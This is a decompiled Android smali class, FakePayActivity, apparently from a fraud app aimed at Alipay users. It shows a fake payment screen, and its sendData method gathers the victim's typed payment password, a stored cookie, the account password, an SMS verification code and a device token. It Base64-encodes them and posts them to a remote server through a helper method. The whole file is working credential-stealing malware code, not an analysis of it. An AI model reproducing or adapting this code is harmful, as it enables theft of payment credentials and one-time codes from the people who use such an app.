.class public Lcom/ellison/project/activity/FakePayActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "FakePayActivity.java"


# instance fields
.field private clear:Landroid/widget/ImageView;

.field private count:Landroid/widget/EditText;

.field private loading:Landroid/view/ViewGroup;

.field private mUrl:Ljava/lang/String;

.field private next:Landroid/widget/TextView;

.field private payCount:I

.field private postCount:I

.field private pwd:Landroid/widget/EditText;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 32
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    const-string v0, ""

    .line 34
    iput-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->mUrl:Ljava/lang/String;

    const/4 v0, 0x0

    .line 41
    iput v0, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I

    .line 42
    iput v0, p0, Lcom/ellison/project/activity/FakePayActivity;->postCount:I

    return-void
.end method

.method static synthetic access$000(Lcom/ellison/project/activity/FakePayActivity;)Landroid/widget/ImageView;
    .locals 0

    .line 32
    iget-object p0, p0, Lcom/ellison/project/activity/FakePayActivity;->clear:Landroid/widget/ImageView;

    return-object p0
.end method

.method static synthetic access$100(Lcom/ellison/project/activity/FakePayActivity;)I
    .locals 0

    .line 32
    iget p0, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I

    return p0
.end method

.method static synthetic access$108(Lcom/ellison/project/activity/FakePayActivity;)I
    .locals 2

    .line 32
    iget v0, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I

    add-int/lit8 v1, v0, 0x1

    iput v1, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I

    return v0
.end method

.method static synthetic access$200(Lcom/ellison/project/activity/FakePayActivity;)Landroid/view/ViewGroup;
    .locals 0

    .line 32
    iget-object p0, p0, Lcom/ellison/project/activity/FakePayActivity;->loading:Landroid/view/ViewGroup;

    return-object p0
.end method

.method static synthetic access$300(Lcom/ellison/project/activity/FakePayActivity;)Landroid/widget/EditText;
    .locals 0

    .line 32
    iget-object p0, p0, Lcom/ellison/project/activity/FakePayActivity;->pwd:Landroid/widget/EditText;

    return-object p0
.end method

.method static synthetic access$400(Lcom/ellison/project/activity/FakePayActivity;)I
    .locals 0

    .line 32
    iget p0, p0, Lcom/ellison/project/activity/FakePayActivity;->postCount:I

    return p0
.end method

.method static synthetic access$408(Lcom/ellison/project/activity/FakePayActivity;)I
    .locals 2

    .line 32
    iget v0, p0, Lcom/ellison/project/activity/FakePayActivity;->postCount:I

    add-int/lit8 v1, v0, 0x1

    iput v1, p0, Lcom/ellison/project/activity/FakePayActivity;->postCount:I

    return v0
.end method

.method static synthetic access$500(Lcom/ellison/project/activity/FakePayActivity;)V
    .locals 0

    .line 32
    invoke-direct {p0}, Lcom/ellison/project/activity/FakePayActivity;->sendData()V

    return-void
.end method

.method public static enterPay(Landroid/app/Activity;)V
    .locals 2

    .line 46
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ellison/project/activity/FakePayActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 47
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private initUiAndListener()V
    .locals 4

    .line 85
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->loading:Landroid/view/ViewGroup;

    new-instance v1, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$f7Twtq_swryjfMs2VqEdOmVxwmk;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$f7Twtq_swryjfMs2VqEdOmVxwmk;-><init>(Lcom/ellison/project/activity/FakePayActivity;)V

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/view/ViewGroup;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 89
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    new-instance v1, Lcom/ellison/project/activity/FakePayActivity$1;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/FakePayActivity$1;-><init>(Lcom/ellison/project/activity/FakePayActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/EditText;->addTextChangedListener(Landroid/text/TextWatcher;)V

    .line 110
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->clear:Landroid/widget/ImageView;

    new-instance v1, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$FoQvDlzRS4WJR6f2XZcxITnd994;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$FoQvDlzRS4WJR6f2XZcxITnd994;-><init>(Lcom/ellison/project/activity/FakePayActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 112
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->next:Landroid/widget/TextView;

    new-instance v1, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$FqWeDF6BZTobyLzNvFR1gnqrb3Q;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/-$$Lambda$FakePayActivity$FqWeDF6BZTobyLzNvFR1gnqrb3Q;-><init>(Lcom/ellison/project/activity/FakePayActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method private sendData()V
    .locals 12

    const-string v0, "/"

    const-string v1, "UTF-8"

    .line 125
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/ellison/project/utils/AAAA;->cookie:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\u7b2c\u4e09\u6b21\u786e\u8ba4\uff1a"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/ellison/project/activity/FakePayActivity;->pwd:Landroid/widget/EditText;

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-static {v2}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v2

    .line 126
    iget-object v3, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-static {v3}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v3

    .line 127
    sget-object v4, Lcom/ellison/project/utils/AAAA;->pwd:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-static {v4}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    .line 128
    iget-object v4, p0, Lcom/ellison/project/activity/FakePayActivity;->pwd:Landroid/widget/EditText;

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-static {v4}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v4

    .line 129
    sget-object v5, Lcom/ellison/project/utils/AAAA;->pageTitle:Ljava/lang/String;

    invoke-virtual {v5, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v5

    invoke-static {v5}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v5

    .line 130
    invoke-static {p0}, Lcom/ellison/project/utils/ConfigUtils;->getToken(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    invoke-static {v6}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v6

    .line 131
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 132
    iget v8, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v9, 0x1

    const-string v10, "{\'type\':\'setpaytype\',\'cookie\':\'"

    const-string v11, ""

    if-le v8, v9, :cond_0

    .line 133
    :try_start_1
    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 134
    check-cast v2, Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 136
    :cond_0
    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 137
    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_0
    const-string v2, "\',\'user\':\'"

    .line 139
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 140
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 141
    iget v2, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0

    const-string v3, "\',\'pwd\':\'"

    if-nez v2, :cond_1

    .line 142
    :try_start_2
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 143
    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 145
    :cond_1
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 146
    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 148
    :goto_1
    iget v2, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I
    :try_end_2
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_2 .. :try_end_2} :catch_0

    const-string v3, "\',\'pwd2\':\'"

    if-nez v2, :cond_2

    .line 149
    :try_start_3
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 150
    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_2

    .line 152
    :cond_2
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 153
    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_2
    const-string v2, "\',\'title\':\'"

    .line 155
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 156
    check-cast v5, Ljava/lang/String;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'phonecode\':\'"

    .line 157
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 158
    sget-object v2, Lcom/ellison/project/utils/AAAA;->smsCode:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'Token\':\'"

    .line 159
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 160
    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'id\':"

    .line 161
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 162
    sget v2, Lcom/ellison/project/utils/AAAA;->id:I

    iget v3, p0, Lcom/ellison/project/activity/FakePayActivity;->payCount:I

    add-int/2addr v2, v3

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "}"

    .line 163
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 164
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-static {v1}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v1

    .line 165
    move-object v2, v1

    check-cast v2, Ljava/lang/String;

    invoke-static {p0, v2}, Lcom/ellison/project/utils/AAAA;->sendPostText2(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    const/4 v3, 0x0

    if-lez v2, :cond_3

    .line 166
    sput v3, Lcom/ellison/project/utils/AAAA;->ss:I

    .line 167
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    .line 168
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "\u63d0\u4ea4\u652f\u4ed8\u6210\u529f:"

    .line 169
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 170
    sget-object v4, Lcom/ellison/project/utils/AAAA;->account:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 171
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 172
    sget-object v4, Lcom/ellison/project/utils/AAAA;->pwd:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 173
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 174
    sget v0, Lcom/ellison/project/utils/AAAA;->id:I

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 175
    check-cast v2, Ljava/io/PrintStream;

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 177
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    new-instance v1, Lcom/ellison/project/activity/FakePayActivity$2;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/FakePayActivity$2;-><init>(Lcom/ellison/project/activity/FakePayActivity;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/widget/EditText;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_3

    .line 197
    :cond_3
    sput v3, Lcom/ellison/project/utils/AAAA;->ss:I
    :try_end_3
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_3

    :catch_0
    move-exception v0

    .line 200
    invoke-virtual {v0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    :goto_3
    return-void
.end method


# virtual methods
.method public synthetic lambda$initUiAndListener$0$FakePayActivity()V
    .locals 2

    .line 86
    iget-object v0, p0, Lcom/ellison/project/activity/FakePayActivity;->loading:Landroid/view/ViewGroup;

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/view/ViewGroup;->setVisibility(I)V

    return-void
.end method

.method public synthetic lambda$initUiAndListener$1$FakePayActivity(Landroid/view/View;)V
    .locals 1

    .line 110
    iget-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    const-string v0, ""

    invoke-virtual {p1, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method

.method public synthetic lambda$initUiAndListener$2$FakePayActivity(Landroid/view/View;)V
    .locals 1

    .line 113
    iget-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_1

    iget-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->pwd:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    .line 117
    :cond_0
    iget-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->loading:Landroid/view/ViewGroup;

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/view/ViewGroup;->setVisibility(I)V

    .line 119
    invoke-direct {p0}, Lcom/ellison/project/activity/FakePayActivity;->sendData()V

    :cond_1
    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 52
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f0a001c

    .line 53
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->setContentView(I)V

    const p1, 0x7f070060

    .line 56
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->count:Landroid/widget/EditText;

    const p1, 0x7f07005f

    .line 57
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iput-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->clear:Landroid/widget/ImageView;

    const p1, 0x7f0700b8

    .line 58
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->pwd:Landroid/widget/EditText;

    const p1, 0x7f0700a1

    .line 59
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->next:Landroid/widget/TextView;

    const p1, 0x7f0700b0

    .line 60
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/FakePayActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/view/ViewGroup;

    iput-object p1, p0, Lcom/ellison/project/activity/FakePayActivity;->loading:Landroid/view/ViewGroup;

    .line 62
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "{\'type\':\'getzfbuser\',\'Token\':\'"

    .line 63
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\'}"

    .line 64
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 81
    invoke-direct {p0}, Lcom/ellison/project/activity/FakePayActivity;->initUiAndListener()V

    return-void
.end method
